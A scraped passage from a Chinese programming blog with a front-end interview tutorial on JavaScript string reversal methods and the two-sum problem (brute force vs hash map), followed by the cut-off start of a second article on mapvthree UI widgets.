                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在前端面试中， <strong>“反转字符串”</strong> 和 <strong>“两数之和”</strong> 虽看似简单，却是考察候选人 <strong>基础扎实度、代码思维、API 熟练度与算法意识</strong> 的经典组合拳。本文将带你：</p>
<ul>
<li>用 <strong>5 种方式实现字符串反转</strong>，对比优劣；</li>
<li>深入剖析 <strong>两数之和的暴力解 vs 哈希优化</strong>；</li>
<li>揭秘面试官真正想考察什么；</li>
<li>提供可直接复用的高质量代码模板。</li>
</ul>
<hr/>
<h2 data-id="heading-0">🔄 一、字符串反转：不止一种写法</h2>
<h3 data-id="heading-1">场景</h3>
<p>输入 <code>'hello'</code>，输出 <code>'olleh'</code>。</p>
<blockquote>
<p>💡 面试官关注点：</p>
<ul>
<li>是否熟悉数组/字符串 API（<code>split</code>, <code>reverse</code>, <code>join</code>）</li>
<li>能否写出清晰、健壮的循环逻辑</li>
<li>是否理解递归思想及其风险</li>
<li>是否会用现代语法（如扩展运算符、reduce）</li>
</ul>
</blockquote>
<hr/>
<h3 data-id="heading-2">✅ 方法1：经典三连（API 流）</h3>
<pre><code class="hljs language-perl" lang="perl">js
编辑
function reverseStr(str) {
  <span class="hljs-keyword">return</span> str.<span class="hljs-keyword">split</span>(<span class="hljs-string">''</span>).<span class="hljs-keyword">reverse</span>().join(<span class="hljs-string">''</span>);
}

const str = <span class="hljs-string">"hello"</span>; 
const arr = str.<span class="hljs-keyword">split</span>(<span class="hljs-string">''</span>); 
<span class="hljs-regexp">//</span> arr 的值会是：[<span class="hljs-string">'h'</span>, <span class="hljs-string">'e'</span>, <span class="hljs-string">'l'</span>, <span class="hljs-string">'l'</span>, <span class="hljs-string">'o'</span>]

const arr = [<span class="hljs-string">'h'</span>, <span class="hljs-string">'e'</span>, <span class="hljs-string">'l'</span>, <span class="hljs-string">'l'</span>, <span class="hljs-string">'o'</span>];
arr.<span class="hljs-keyword">reverse</span>(); 
<span class="hljs-regexp">//</span> 调用后，arr 本身被修改了，现在的值是：[<span class="hljs-string">'o'</span>, <span class="hljs-string">'l'</span>, <span class="hljs-string">'l'</span>, <span class="hljs-string">'e'</span>, <span class="hljs-string">'h'</span>]

const reversedArr = [<span class="hljs-string">'o'</span>, <span class="hljs-string">'l'</span>, <span class="hljs-string">'l'</span>, <span class="hljs-string">'e'</span>, <span class="hljs-string">'h'</span>]; 
const reversedStr = reversedArr.join(<span class="hljs-string">''</span>); 
<span class="hljs-regexp">//</span> reversedStr 的值会是：<span class="hljs-string">"olleh"</span>
</code></pre>
<ul>
<li><strong>优点</strong>：简洁、可读性强，体现对内置方法的掌握。</li>
<li><strong>缺点</strong>：创建中间数组，内存开销略高（但通常可忽略）。</li>
</ul>
<hr/>
<h3 data-id="heading-3">✅ 方法2：传统 for 循环（从后往前）</h3>
<pre><code class="hljs language-ini" lang="ini">js
编辑
function reverseStr(str) {
  let <span class="hljs-attr">reversed</span> = <span class="hljs-string">''</span><span class="hljs-comment">;</span>
  for (let <span class="hljs-attr">i</span> = str.length - <span class="hljs-number">1</span><span class="hljs-comment">; i &gt;= 0; i--) {</span>
    reversed += str<span class="hljs-section">[i]</span><span class="hljs-comment">;</span>
  }
  return reversed<span class="hljs-comment">;</span>
}
</code></pre>
<ul>
<li><strong>优点</strong>：逻辑直观，兼容性好（ES3 起支持）。</li>
<li><strong>注意</strong>：字符串拼接在旧引擎中可能低效（现代 V8 已优化）。</li>
</ul>
<hr/>
<h3 data-id="heading-4">✅ 方法3：for...of 反向拼接</h3>
<pre><code class="hljs language-csharp" lang="csharp">js
编辑
<span class="hljs-function">function <span class="hljs-title">reverseStr</span>(<span class="hljs-params">str</span>)</span> {
  <span class="hljs-keyword">let</span> reversed = <span class="hljs-string">''</span>;
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> <span class="hljs-built_in">char</span> of str) {
    reversed = <span class="hljs-built_in">char</span> + reversed; <span class="hljs-comment">// 每次把新字符放前面</span>
  }
  <span class="hljs-keyword">return</span> reversed;
}
</code></pre>
<ul>
<li><strong>优点</strong>：避免索引操作，更符合“遍历字符”语义。</li>
<li><strong>缺点</strong>：频繁字符串拼接（虽现代 JS 引擎已优化）。</li>
</ul>
<hr/>
<h3 data-id="heading-5">✅ 方法4：扩展运算符 + 数组方法（ES6+）</h3>
<pre><code class="hljs language-python" lang="python">js
编辑
function reverseStr(<span class="hljs-built_in">str</span>) {
  <span class="hljs-keyword">return</span> [...<span class="hljs-built_in">str</span>].reverse().join(<span class="hljs-string">''</span>);
}

const <span class="hljs-built_in">str</span> = <span class="hljs-string">"hello"</span>; const arr = [...<span class="hljs-built_in">str</span>]; 
// arr 的值会是：[<span class="hljs-string">'h'</span>, <span class="hljs-string">'e'</span>, <span class="hljs-string">'l'</span>, <span class="hljs-string">'l'</span>, <span class="hljs-string">'o'</span>]
</code></pre>
<ul>
<li><strong>优点</strong>：比 <code>split('')</code> 更优雅（尤其对 emoji/Unicode 支持更好）。</li>
<li><strong>原理</strong>：<code>[...str]</code> 能正确处理 UTF-16 代理对（如 <code>'👨‍💻'.length === 5</code>，但 <code>[...'👨‍💻'].length === 1</code>）。</li>
</ul>
<blockquote>
<p>🌰 对比：</p>
<pre><code class="hljs language-bash" lang="bash">js
编辑
<span class="hljs-string">'café'</span>.<span class="hljs-built_in">split</span>(<span class="hljs-string">''</span>)   // [<span class="hljs-string">'c'</span>,<span class="hljs-string">'a'</span>,<span class="hljs-string">'f'</span>,<span class="hljs-string">'é'</span>] ✅
<span class="hljs-string">'👨‍💻'</span>.<span class="hljs-built_in">split</span>(<span class="hljs-string">''</span>)    // [<span class="hljs-string">'👨'</span>, <span class="hljs-string">'‍'</span>, <span class="hljs-string">'💻'</span>] ❌
[...<span class="hljs-string">'👨‍💻'</span>]         // [<span class="hljs-string">'👨‍💻'</span>] ✅
</code></pre>
</blockquote>
<hr/>
<h3 data-id="heading-6">✅ 方法5：递归实现（展示思维）</h3>
<pre><code class="hljs language-rust" lang="rust">js
编辑
function <span class="hljs-title function_ invoke__">reverseStr</span>(<span class="hljs-type">str</span>) {
  <span class="hljs-title function_ invoke__">if</span> (<span class="hljs-type">str</span> === '') <span class="hljs-keyword">return</span> ''; <span class="hljs-comment">// 终止条件</span>
  <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">reverseStr</span>(<span class="hljs-type">str</span>.<span class="hljs-title function_ invoke__">substring</span>(<span class="hljs-number">1</span>)) + <span class="hljs-type">str</span>.<span class="hljs-title function_ invoke__">charAt</span>(<span class="hljs-number">0</span>);
}

<span class="hljs-keyword">const</span> <span class="hljs-type">str</span> = <span class="hljs-string">"hello"</span>; 
<span class="hljs-keyword">const</span> subStr = <span class="hljs-type">str</span>.<span class="hljs-title function_ invoke__">substring</span>(<span class="hljs-number">1</span>); 
<span class="hljs-comment">// subStr 的值会是："ello" (从索引1的 'e' 开始到末尾)</span>

<span class="hljs-keyword">const</span> <span class="hljs-type">str</span> = <span class="hljs-string">"hello"</span>; 
<span class="hljs-keyword">const</span> firstChar = <span class="hljs-type">str</span>.<span class="hljs-title function_ invoke__">charAt</span>(<span class="hljs-number">0</span>); 
<span class="hljs-comment">// firstChar 的值会是："h" (索引0位置的字符)</span>

<span class="hljs-number">1</span>.  `<span class="hljs-title function_ invoke__">reverseStr</span>(<span class="hljs-string">"hello"</span>)` 调用 `<span class="hljs-title function_ invoke__">reverseStr</span>(<span class="hljs-string">"ello"</span>)`
<span class="hljs-number">1</span>.  `<span class="hljs-title function_ invoke__">reverseStr</span>(<span class="hljs-string">"ello"</span>)` 调用 `<span class="hljs-title function_ invoke__">reverseStr</span>(<span class="hljs-string">"llo"</span>)`
<span class="hljs-number">1</span>.  `<span class="hljs-title function_ invoke__">reverseStr</span>(<span class="hljs-string">"llo"</span>)` 调用 `<span class="hljs-title function_ invoke__">reverseStr</span>(<span class="hljs-string">"lo"</span>)`
<span class="hljs-number">1</span>.  `<span class="hljs-title function_ invoke__">reverseStr</span>(<span class="hljs-string">"lo"</span>)` 调用 `<span class="hljs-title function_ invoke__">reverseStr</span>(<span class="hljs-string">"o"</span>)`
<span class="hljs-number">1</span>.  `<span class="hljs-title function_ invoke__">reverseStr</span>(<span class="hljs-string">"o"</span>)` 调用 `<span class="hljs-title function_ invoke__">reverseStr</span>(<span class="hljs-string">""</span>)`
<span class="hljs-number">1</span>.  `<span class="hljs-title function_ invoke__">reverseStr</span>(<span class="hljs-string">""</span>)` 触发终止条件，返回 `<span class="hljs-string">""</span>`
<span class="hljs-number">1</span>.  `<span class="hljs-title function_ invoke__">reverseStr</span>(<span class="hljs-string">"o"</span>)` 得到返回值 `<span class="hljs-string">""</span> + <span class="hljs-string">"o"</span>`，即 `<span class="hljs-string">"o"</span>`，并返回
<span class="hljs-number">1</span>.  `<span class="hljs-title function_ invoke__">reverseStr</span>(<span class="hljs-string">"lo"</span>)` 得到返回值 `<span class="hljs-string">"o"</span> + <span class="hljs-string">"l"</span>`，即 `<span class="hljs-string">"ol"</span>`，并返回
<span class="hljs-number">1</span>.  `<span class="hljs-title function_ invoke__">reverseStr</span>(<span class="hljs-string">"llo"</span>)` 得到返回值 `<span class="hljs-string">"ol"</span> + <span class="hljs-string">"l"</span>`，即 `<span class="hljs-string">"oll"</span>`，并返回
<span class="hljs-number">1</span>.  `<span class="hljs-title function_ invoke__">reverseStr</span>(<span class="hljs-string">"ello"</span>)` 得到返回值 `<span class="hljs-string">"oll"</span> + <span class="hljs-string">"e"</span>`，即 `<span class="hljs-string">"olle"</span>`，并返回
<span class="hljs-number">1</span>.  `<span class="hljs-title function_ invoke__">reverseStr</span>(<span class="hljs-string">"hello"</span>)` 得到返回值 `<span class="hljs-string">"olle"</span> + <span class="hljs-string">"h"</span>`，即 `<span class="hljs-string">"olleh"</span>`，并返回给最初的调用者
</code></pre>
<ul>
<li>
<p><strong>优点</strong>：体现分治思想，代码简洁。</p>
</li>
<li>
<p><strong>⚠️ 风险</strong>：</p>
<ul>
<li><strong>爆栈</strong>：长字符串（如 &gt;10,000 字符）会导致栈溢出；</li>
<li><strong>性能差</strong>：每次 <code>substring</code> 都创建新字符串，时间复杂度 O(n²)。</li>
</ul>
</li>
</ul>
<blockquote>
<p>🚫 <strong>不推荐生产使用</strong>，但面试可作为“展示递归理解”的备选。</p>
</blockquote>
<hr/>
<h3 data-id="heading-7">✅ 方法6：reduce 高阶函数（函数式风格）</h3>
<pre><code class="hljs language-javascript" lang="javascript">js
编辑
<span class="hljs-keyword">function</span> <span class="hljs-title function_">reverseStr</span>(<span class="hljs-params">str</span>) {
  <span class="hljs-keyword">return</span> [...str].<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">reversed, char</span>) =&gt;</span> char + reversed, <span class="hljs-string">''</span>);
}
</code></pre>
<ul>
<li><strong>优点</strong>：无状态、纯函数风格，适合函数式编程场景。</li>
<li><strong>缺点</strong>：可读性略低于三连 API。</li>
</ul>
<hr/>
<h2 data-id="heading-8">📊 反转方法对比总结</h2>






















































<table><thead><tr><th>方法</th><th>可读性</th><th>性能</th><th>Unicode 安全</th><th>推荐场景</th></tr></thead><tbody><tr><td><code>split+reverse+join</code></td><td>⭐⭐⭐⭐</td><td>⭐⭐⭐</td><td>❌（部分）</td><td>快速实现</td></tr><tr><td><code>for</code> 循环</td><td>⭐⭐⭐</td><td>⭐⭐⭐⭐</td><td>✅</td><td>兼容老环境</td></tr><tr><td><code>for...of</code></td><td>⭐⭐⭐⭐</td><td>⭐⭐⭐</td><td>✅</td><td>现代项目</td></tr><tr><td><code>[...str]</code></td><td>⭐⭐⭐⭐⭐</td><td>⭐⭐⭐</td><td>✅✅</td><td><strong>首选推荐</strong></td></tr><tr><td>递归</td><td>⭐⭐</td><td>⭐</td><td>✅</td><td>面试展示</td></tr><tr><td><code>reduce</code></td><td>⭐⭐⭐</td><td>⭐⭐</td><td>✅</td><td>函数式偏好</td></tr></tbody></table>
<blockquote>
<p>✅ <strong>最佳实践</strong>：日常开发优先用 <code>[...str].reverse().join('')</code>。</p>
</blockquote>
<hr/>
<h2 data-id="heading-9">🔢 二、两数之和：从暴力到哈希优化</h2>
<blockquote>
<p><strong>题目</strong>：给定整数数组 <code>nums</code> 和目标值 <code>target</code>，找出两个数的索引，使其和等于 <code>target</code>。假设每组输入只有一组解。</p>
</blockquote>
<h3 data-id="heading-10">面试官真实意图：</h3>
<ul>
<li>考察 <strong>时间复杂度意识</strong></li>
<li>是否知道  <strong>“空间换时间”</strong>  思想</li>
<li>对 <strong>数据结构选择</strong> 的敏感度（Object vs Map）</li>
</ul>
<hr/>
<h3 data-id="heading-11">❌ 解法1：暴力双重循环（O(n²)）</h3>
<pre><code class="hljs language-ini" lang="ini">js
编辑
function twoSum(nums, target) {
  for (let <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; nums.length; i++) {</span>
    for (let <span class="hljs-attr">j</span> = i + <span class="hljs-number">1</span><span class="hljs-comment">; j &lt; nums.length; j++) {</span>
      if (nums<span class="hljs-section">[i]</span> + nums<span class="hljs-section">[j]</span> === target) {
        return <span class="hljs-section">[i, j]</span><span class="hljs-comment">;</span>
      }
    }
  }
}
</code></pre>
<ul>
<li><strong>问题</strong>：n=10⁴ 时，操作次数达 5×10⁷，明显超时。</li>
<li><strong>结论</strong>：仅用于兜底或教学演示。</li>
</ul>
<hr/>
<h3 data-id="heading-12">✅ 解法2：哈希表优化（O(n)）——核心思路</h3>
<h4 data-id="heading-13">核心思想：</h4>
<blockquote>
<p><strong>“求和变求差”</strong><br/>
遍历时，记录每个数字及其索引；<br/>
对当前 <code>num</code>，检查 <code>target - num</code> 是否已存在。</p>
</blockquote>
<h4 data-id="heading-14">方案A：使用普通对象（Object）</h4>
<pre><code class="hljs language-ini" lang="ini">js
编辑
function twoSum(nums, target) {
  const <span class="hljs-attr">map</span> = {}<span class="hljs-comment">;</span>
  for (let <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; nums.length; i++) {</span>
    const <span class="hljs-attr">complement</span> = target - nums[i]<span class="hljs-comment">;</span>
    if (map<span class="hljs-section">[complement]</span> !== undefined) {
      return <span class="hljs-section">[map[complement]</span>, i]<span class="hljs-comment">;</span>
    }
    map<span class="hljs-section">[nums[i]]</span> = i<span class="hljs-comment">;</span>
  }
}
</code></pre>
<ul>
<li><strong>风险</strong>：键为字符串，若 <code>nums</code> 含非数字（如 <code>'2'</code>），可能混淆；</li>
<li><strong>性能</strong>：V8 对对象属性访问高度优化，实际很快。</li>
</ul>
<h4 data-id="heading-15">方案B：使用 <code>Map</code>（推荐！）</h4>
<pre><code class="hljs language-ini" lang="ini">js
编辑
function twoSum(nums, target) {
  const <span class="hljs-attr">map</span> = new Map()<span class="hljs-comment">;</span>
  for (let <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; nums.length; i++) {</span>
    const <span class="hljs-attr">complement</span> = target - nums[i]<span class="hljs-comment">;</span>
    if (map.has(complement)) {
      return <span class="hljs-section">[map.get(complement), i]</span><span class="hljs-comment">;</span>
    }
    map.set(nums<span class="hljs-section">[i]</span>, i)<span class="hljs-comment">;</span>
  }
}
</code></pre>
<ul>
<li>
<p><strong>优势</strong>：</p>
<ul>
<li>键类型保持原样（number 还是 number）；</li>
<li><code>has()</code> / <code>get()</code> 语义清晰；</li>
<li>避免原型链污染（如 <code>map.__proto__</code> 干扰）；</li>
<li>更符合“键值对容器”语义。</li>
</ul>
</li>
</ul>
<blockquote>
<p>📌 <strong>面试加分点</strong>：主动说出 “我选择 <code>Map</code> 而非对象，因为……”</p>
</blockquote>
<hr/>
<h2 data-id="heading-16">🧠 三、面试官到底想考什么？</h2>




















<table><thead><tr><th>题目</th><th>考察维度</th><th>高分回答要点</th></tr></thead><tbody><tr><td>字符串反转</td><td>- API 熟练度 - 代码风格 - 边界意识</td><td>“我会优先用 <code>[...str]</code> 因为它对 Unicode 更安全”</td></tr><tr><td>两数之和</td><td>- 算法思维 - 数据结构选择 - 复杂度分析</td><td>“暴力是 O(n²)，我用哈希表降到 O(n)，空间换时间”</td></tr></tbody></table>
<blockquote>
<p>💡 <strong>避坑提示</strong>：</p>
<ul>
<li>不要一上来就写递归（除非被要求）；</li>
<li>不要说“Object 和 Map 一样”（暴露基础不牢）；</li>
<li>记得处理边界（如空字符串、无解情况）。</li>
</ul>
</blockquote>
<hr/>
<h2 data-id="heading-17">📌 四、总结 &amp; 复习清单</h2>
<h3 data-id="heading-18">✅ 字符串反转</h3>
<ul>
<li><strong>首选写法</strong>：<code>[...str].reverse().join('')</code></li>
<li><strong>慎用递归</strong>：有爆栈风险，性能差</li>
<li><strong>注意 Unicode</strong>：<code>split('')</code> 对 emoji 不友好</li>
</ul>
<h3 data-id="heading-19">✅ 两数之和</h3>
<ul>
<li><strong>最优解</strong>：<code>Map</code> + 一次遍历，O(n) 时间</li>
<li><strong>关键转换</strong>：<code>a + b = target</code> → <code>b = target - a</code></li>
<li><strong>不要用 Object 当哈希表</strong>（除非明确知道数据安全）</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[JSAPIThree UI 控件学习笔记：用内置控件提升交互]]></title>    <link>https://juejin.cn/post/7576928016901455882</link>    <guid>https://juejin.cn/post/7576928016901455882</guid>    <pubDate>2025-11-27T06:23:13.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576928016901455882" data-draft-id="7576978338754658354" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="JSAPIThree UI 控件学习笔记：用内置控件提升交互"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2025-11-27T06:23:13.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="用户296541275917"/> <meta itemprop="url" content="https://juejin.cn/user/4109293389357897"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            JSAPIThree UI 控件学习笔记：用内置控件提升交互
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4109293389357897/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    用户296541275917
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-27T06:23:13.000Z" title="Thu Nov 27 2025 06:23:13 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-27
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>作为刚接触 mapvthree 的新手，今天我专门学习了 UI 控件模块。这里整理出最常用的控件和实用技巧，帮助和我一样的初学者快速上手。</p>
</blockquote>
<h2 data-id="heading-0">控件管理入口：engine.widgets</h2>
<p>mapvthree 中的控件由 <code>EngineWidgets</code> 管理，实例化后可以通过 <code>engine.widgets</code> 访问。控件分两种启用方式：</p>
<ol>
<li><strong>初始化时配置</strong>：在 <code>new Engine()</code> 时，通过 <code>widgets</code> 字段设置 <code>enabled</code></li>
<li><strong>运行时控制</strong>：引擎创建完成后，直接修改 <code>engine.widgets.xxx.enabled</code></li>
</ol>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> engine = <span class="hljs-keyword">new</span> mapvthree.<span class="hljs-title class_">Engine</span>(container, {
    <span class="hljs-attr">map</span>: { <span class="hljs-attr">center</span>: [<span class="hljs-number">106.515</span>, <span class="hljs-number">29.639</span>], <span class="hljs-attr">range</span>: <span class="hljs-number">500</span> },
